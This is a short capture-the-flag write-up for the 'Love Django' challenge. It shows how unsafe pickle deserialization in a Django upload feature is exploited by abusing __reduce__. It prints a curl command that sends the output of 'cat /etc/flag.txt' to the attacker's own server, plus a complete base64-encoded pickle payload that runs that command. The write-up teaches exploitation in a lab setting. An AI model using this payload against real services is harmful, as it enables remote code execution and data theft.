# Love Django(998 pts) (2 solves) #

![TASK](https://imgur.com/Z73SeQV.png)

This task was published in Securinets-Mini CTF but unfortunately it had 0 solves :'( However two teams managed to solve it in NCSC2.0_CTF , the idea is simple we have an unsafe serialization using pickle, let's begin our road !

When we visit the url we have this web application that generates an id and has an upload and download functionality

![WEB](https://imgur.com/ShHvMqy.png)

we try to generate an id and download it and BINGO the filename is pickle_shinobi.data, so now we are pretty sure that it's an unsafe serialization 

![WEB](https://imgur.com/usG1M4H.png)

Now we will use the famous pickle magic function __REDUCE__ and import os library then execute this simple command
> curl YourVpsIP/?a=`cat /etc/flag.txt`

Final Payload to Upload (Base64 encoded) :
> Y3Bvc2l4CnN5c3RlbQpwMAooUydjdXJsIFlvdXJWcHNJUC8/YT1gY2F0IC9ldGMvZmxhZy50eHRgJwpwMQp0cDIKUnAzCi4=

![WEB](https://imgur.com/HpGGVJK.png)

Ofc don't forget to listen on your server xd And Bingo we have our flag :D 

>Securinets{DjanGo_1}
